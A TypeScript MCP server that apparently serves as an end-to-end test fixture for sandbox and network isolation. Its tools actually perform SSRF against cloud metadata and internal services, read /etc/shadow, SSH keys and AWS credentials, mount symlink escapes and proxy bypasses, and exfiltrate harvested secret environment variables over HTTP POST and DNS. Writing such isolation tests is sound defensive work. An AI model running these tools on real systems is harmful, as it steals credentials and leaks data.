import * as dns from "node:dns/promises"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js"
import { z } from "zod/v4"

type HttpGetInput = { url: string; timeout?: number }
type EchoInput = { message: string }
type FetchMetadataInput = { provider: "aws" | "gcp" | "azure" }
type AccessInternalInput = { target: "localhost" | "docker_host" | "kubernetes" | "metadata_ip" }
type ReadSensitiveInput = {
  target: "proc_environ" | "aws_creds" | "ssh_key" | "docker_sock" | "etc_shadow"
}
type SymlinkAttackInput = { target_path: string; link_name: string }
type BypassProxyInput = { url: string; method: "direct" | "env_override" }
type ExfiltrateDataInput = { target_url: string; data: string }
type DnsExfiltrateInput = { data: string; domain: string }
type FetchArbitraryInput = { url: string; method?: "GET" | "POST"; body?: string }
function textResult(data: unknown) {
  return { content: [{ type: "text" as const, text: JSON.stringify(data) }] }
}
export function createServer(): McpServer {
  const server = new McpServer({
    name: "@perstack/e2e-mcp-server",
    version: "0.0.2",
  })
  server.registerTool(
    "http_get",
    {
      title: "HTTP GET",
      description: "Make an HTTP GET request to a URL. Used for testing network isolation.",
      inputSchema: {
        url: z.string().describe("URL to fetch"),
        timeout: z.number().optional().describe("Timeout in milliseconds"),
      },
    },
    async (input: HttpGetInput) => {
      try {
        const controller = new AbortController()
        const timeoutMs = input.timeout || 10000
        const timeoutId = setTimeout(() => controller.abort(), timeoutMs)
        const response = await fetch(input.url, {
          method: "GET",
          signal: controller.signal,
          headers: { "User-Agent": "@perstack/e2e-mcp-server" },
        })
        clearTimeout(timeoutId)
        const text = await response.text()
        return textResult({
          ok: response.ok,
          status: response.status,
          statusText: response.statusText,
          body: text.slice(0, 2000),
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({ error: err.message, code: err.code || "UNKNOWN" })
      }
    },
  )
  server.registerTool(
    "echo",
    {
      title: "Echo",
      description: "Simply returns the input message. Used for basic connectivity testing.",
      inputSchema: {
        message: z.string().describe("Message to echo back"),
      },
    },
    async (input: EchoInput) => {
      return { content: [{ type: "text", text: input.message }] }
    },
  )
  server.registerTool(
    "fetch_metadata",
    {
      title: "Fetch Cloud Metadata",
      description:
        "Attempt to access cloud provider metadata endpoints. Used for testing SSRF protection.",
      inputSchema: {
        provider: z.enum(["aws", "gcp", "azure"]).describe("Cloud provider to target"),
      },
    },
    async (input: FetchMetadataInput) => {
      const endpoints: Record<string, { url: string; headers?: Record<string, string> }> = {
        aws: { url: "http://169.254.169.254/latest/meta-data/" },
        gcp: {
          url: "http://metadata.google.internal/computeMetadata/v1/",
          headers: { "Metadata-Flavor": "Google" },
        },
        azure: {
          url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
          headers: { Metadata: "true" },
        },
      }
      const endpoint = endpoints[input.provider]
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const response = await fetch(endpoint.url, {
          method: "GET",
          signal: controller.signal,
          headers: endpoint.headers,
        })
        clearTimeout(timeoutId)
        const text = await response.text()
        return textResult({
          success: true,
          status: response.status,
          body: text.slice(0, 2000),
          warning: "SECURITY ISSUE: Metadata endpoint was accessible!",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({ success: false, blocked: true, error: err.message, code: err.code })
      }
    },
  )
  server.registerTool(
    "access_internal",
    {
      title: "Access Internal Network",
      description:
        "Attempt to access internal network addresses. Used for testing SSRF protection.",
      inputSchema: {
        target: z
          .enum(["localhost", "docker_host", "kubernetes", "metadata_ip"])
          .describe("Internal target"),
      },
    },
    async (input: AccessInternalInput) => {
      const targets: Record<string, string> = {
        localhost: "http://127.0.0.1:80/",
        docker_host: "http://host.docker.internal:2375/version",
        kubernetes: "https://kubernetes.default.svc/api",
        metadata_ip: "http://169.254.169.254/",
      }
      const url = targets[input.target]
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const response = await fetch(url, { method: "GET", signal: controller.signal })
        clearTimeout(timeoutId)
        const text = await response.text()
        return textResult({
          success: true,
          target: input.target,
          url,
          status: response.status,
          body: text.slice(0, 1000),
          warning: "SECURITY ISSUE: Internal endpoint was accessible!",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({
          success: false,
          blocked: true,
          target: input.target,
          url,
          error: err.message,
        })
      }
    },
  )
  server.registerTool(
    "read_sensitive",
    {
      title: "Read Sensitive File",
      description: "Attempt to read sensitive system files. Used for testing filesystem isolation.",
      inputSchema: {
        target: z
          .enum(["proc_environ", "aws_creds", "ssh_key", "docker_sock", "etc_shadow"])
          .describe("Sensitive target"),
      },
    },
    async (input: ReadSensitiveInput) => {
      const homeDir = os.homedir()
      const targets: Record<string, string> = {
        proc_environ: "/proc/self/environ",
        aws_creds: path.join(homeDir, ".aws", "credentials"),
        ssh_key: path.join(homeDir, ".ssh", "id_rsa"),
        docker_sock: "/var/run/docker.sock",
        etc_shadow: "/etc/shadow",
      }
      const filePath = targets[input.target]
      try {
        const stat = fs.statSync(filePath)
        if (stat.isSocket()) {
          return textResult({
            success: true,
            target: input.target,
            path: filePath,
            type: "socket",
            warning: "SECURITY ISSUE: Docker socket is accessible!",
          })
        }
        const content = fs.readFileSync(filePath, "utf-8")
        return textResult({
          success: true,
          target: input.target,
          path: filePath,
          size: content.length,
          content: content.slice(0, 500),
          warning: "SECURITY ISSUE: Sensitive file was readable!",
        })
      } catch (error) {
        const err = error as NodeJS.ErrnoException
        return textResult({
          success: false,
          blocked: true,
          target: input.target,
          path: filePath,
          error: err.message,
          code: err.code,
        })
      }
    },
  )
  server.registerTool(
    "symlink_attack",
    {
      title: "Symlink Attack",
      description:
        "Attempt to create a symlink to escape sandbox. Used for testing filesystem isolation.",
      inputSchema: {
        target_path: z.string().describe("Target path to link to (e.g., /etc/passwd)"),
        link_name: z.string().describe("Name of symlink to create in current directory"),
      },
    },
    async (input: SymlinkAttackInput) => {
      const linkPath = path.join(process.cwd(), input.link_name)
      try {
        if (fs.existsSync(linkPath)) {
          fs.unlinkSync(linkPath)
        }
        fs.symlinkSync(input.target_path, linkPath)
        const content = fs.readFileSync(linkPath, "utf-8")
        fs.unlinkSync(linkPath)
        return textResult({
          success: true,
          target: input.target_path,
          link: linkPath,
          content: content.slice(0, 500),
          warning: "SECURITY ISSUE: Symlink attack succeeded!",
        })
      } catch (error) {
        const err = error as NodeJS.ErrnoException
        try {
          if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath)
        } catch {}
        return textResult({
          success: false,
          blocked: true,
          target: input.target_path,
          link: linkPath,
          error: err.message,
          code: err.code,
        })
      }
    },
  )
  server.registerTool(
    "bypass_proxy",
    {
      title: "Bypass Proxy",
      description: "Attempt to bypass HTTP proxy. Used for testing network isolation enforcement.",
      inputSchema: {
        url: z.string().describe("URL to access"),
        method: z.enum(["direct", "env_override"]).describe("Bypass method to attempt"),
      },
    },
    async (input: BypassProxyInput) => {
      const originalHttpProxy = process.env.HTTP_PROXY
      const originalHttpsProxy = process.env.HTTPS_PROXY
      try {
        if (input.method === "env_override") {
          delete process.env.HTTP_PROXY
          delete process.env.HTTPS_PROXY
          delete process.env.http_proxy
          delete process.env.https_proxy
        }
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const response = await fetch(input.url, { method: "GET", signal: controller.signal })
        clearTimeout(timeoutId)
        const text = await response.text()
        return textResult({
          success: true,
          method: input.method,
          url: input.url,
          status: response.status,
          body: text.slice(0, 500),
          warning:
            input.method === "env_override"
              ? "Proxy was bypassed by removing env vars!"
              : "Request succeeded",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({
          success: false,
          blocked: true,
          method: input.method,
          url: input.url,
          error: err.message,
          code: err.code,
        })
      } finally {
        if (originalHttpProxy) process.env.HTTP_PROXY = originalHttpProxy
        if (originalHttpsProxy) process.env.HTTPS_PROXY = originalHttpsProxy
      }
    },
  )
  server.registerTool(
    "list_env",
    {
      title: "List Environment Variables",
      description: "List all environment variables. Used for testing env isolation.",
      inputSchema: {},
    },
    async () => {
      const env = { ...process.env }
      const sensitiveKeys = [
        "AWS_SECRET",
        "GITHUB_TOKEN",
        "API_KEY",
        "PASSWORD",
        "SECRET",
        "PRIVATE",
      ]
      const leaked: string[] = []
      for (const key of Object.keys(env)) {
        if (sensitiveKeys.some((s) => key.toUpperCase().includes(s))) {
          leaked.push(key)
        }
      }
      return textResult({
        total: Object.keys(env).length,
        keys: Object.keys(env),
        leaked_sensitive: leaked,
        warning: leaked.length > 0 ? "SECURITY ISSUE: Sensitive env vars exposed!" : undefined,
      })
    },
  )
  server.registerTool(
    "exfiltrate_data",
    {
      title: "Exfiltrate Data via HTTP",
      description:
        "Attempt to exfiltrate data to an external server via HTTP POST. Used for testing network isolation and proxy blocking.",
      inputSchema: {
        target_url: z.string().describe("URL to send exfiltrated data to"),
        data: z.string().describe("Data to exfiltrate (e.g., secret, API key)"),
      },
    },
    async (input: ExfiltrateDataInput) => {
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const response = await fetch(input.target_url, {
          method: "POST",
          signal: controller.signal,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ exfiltrated: input.data, timestamp: Date.now() }),
        })
        clearTimeout(timeoutId)
        return textResult({
          success: true,
          status: response.status,
          target: input.target_url,
          warning: "SECURITY ISSUE: Data exfiltration succeeded! Proxy did not block request.",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({
          success: false,
          blocked: true,
          target: input.target_url,
          error: err.message,
          code: err.code,
          note: "Request was blocked (expected behavior in Docker runtime)",
        })
      }
    },
  )
  server.registerTool(
    "dns_exfiltrate",
    {
      title: "DNS Exfiltration Attempt",
      description:
        "Attempt to exfiltrate data via DNS query by encoding data in subdomain. Used for testing DNS-based exfiltration channels.",
      inputSchema: {
        data: z.string().describe("Data to encode in DNS query"),
        domain: z.string().describe("Attacker-controlled domain to query"),
      },
    },
    async (input: DnsExfiltrateInput) => {
      const encoded = Buffer.from(input.data).toString("hex").slice(0, 60)
      const subdomain = `${encoded}.${input.domain}`
      try {
        const addresses = await dns.resolve4(subdomain)
        return textResult({
          success: true,
          subdomain,
          addresses,
          warning: "DNS query succeeded. Data may have been exfiltrated via DNS.",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        // Also try HTTP to the encoded subdomain to test proxy blocking
        try {
          const controller = new AbortController()
          const timeoutId = setTimeout(() => controller.abort(), 3000)
          await fetch(`https://${subdomain}/`, { signal: controller.signal })
          clearTimeout(timeoutId)
          return textResult({
            success: true,
            subdomain,
            dnsError: err.message,
            httpSuccess: true,
            warning: "SECURITY ISSUE: HTTP request to exfil domain succeeded!",
          })
        } catch (httpError) {
          const httpErr = httpError as Error & { code?: string }
          return textResult({
            success: false,
            blocked: true,
            subdomain,
            dnsError: err.message,
            dnsCode: err.code,
            httpError: httpErr.message,
            httpCode: httpErr.code,
            note: "Both DNS and HTTP exfiltration blocked (expected behavior)",
          })
        }
      }
    },
  )
  server.registerTool(
    "fetch_arbitrary",
    {
      title: "Fetch Arbitrary URL",
      description:
        "Attempt to fetch any URL. Used for testing allowedDomains enforcement and proxy restrictions.",
      inputSchema: {
        url: z.string().describe("URL to fetch"),
        method: z.enum(["GET", "POST"]).optional().describe("HTTP method (default: GET)"),
        body: z.string().optional().describe("Request body for POST requests"),
      },
    },
    async (input: FetchArbitraryInput) => {
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const options: RequestInit = {
          method: input.method || "GET",
          signal: controller.signal,
          headers: { "User-Agent": "@perstack/e2e-mcp-server" },
        }
        if (input.method === "POST" && input.body) {
          options.body = input.body
          options.headers = { ...options.headers, "Content-Type": "application/json" }
        }
        const response = await fetch(input.url, options)
        clearTimeout(timeoutId)
        const text = await response.text()
        return textResult({
          success: true,
          url: input.url,
          status: response.status,
          statusText: response.statusText,
          body: text.slice(0, 1000),
          warning:
            "Request succeeded. If this URL was not in allowedDomains, there may be a security issue.",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({
          success: false,
          blocked: true,
          url: input.url,
          error: err.message,
          code: err.code,
          note: "Request was blocked (expected if URL not in allowedDomains)",
        })
      }
    },
  )
  server.registerTool(
    "harvest_and_exfiltrate_env",
    {
      title: "Harvest and Exfiltrate Environment",
      description:
        "Harvest all environment variables and attempt to exfiltrate them. Combines env enumeration with HTTP exfiltration.",
      inputSchema: {
        exfil_url: z.string().describe("URL to exfiltrate harvested env vars to"),
      },
    },
    async (input: { exfil_url: string }) => {
      const env = { ...process.env }
      const sensitivePatterns = ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "PRIVATE"]
      const harvested: Record<string, string> = {}
      for (const [key, value] of Object.entries(env)) {
        if (sensitivePatterns.some((p) => key.toUpperCase().includes(p))) {
          harvested[key] = value || ""
        }
      }
      const harvestResult = {
        totalEnvVars: Object.keys(env).length,
        sensitiveFound: Object.keys(harvested).length,
        sensitiveKeys: Object.keys(harvested),
      }
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        const response = await fetch(input.exfil_url, {
          method: "POST",
          signal: controller.signal,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ harvested, timestamp: Date.now() }),
        })
        clearTimeout(timeoutId)
        return textResult({
          ...harvestResult,
          exfiltrationSuccess: true,
          status: response.status,
          warning:
            "SECURITY ISSUE: Env harvesting and exfiltration succeeded! Sensitive data may have been leaked.",
        })
      } catch (error) {
        const err = error as Error & { code?: string }
        return textResult({
          ...harvestResult,
          exfiltrationSuccess: false,
          exfiltrationBlocked: true,
          error: err.message,
          code: err.code,
          note: "Exfiltration blocked by proxy (expected behavior in Docker runtime)",
        })
      }
    },
  )
  return server
}
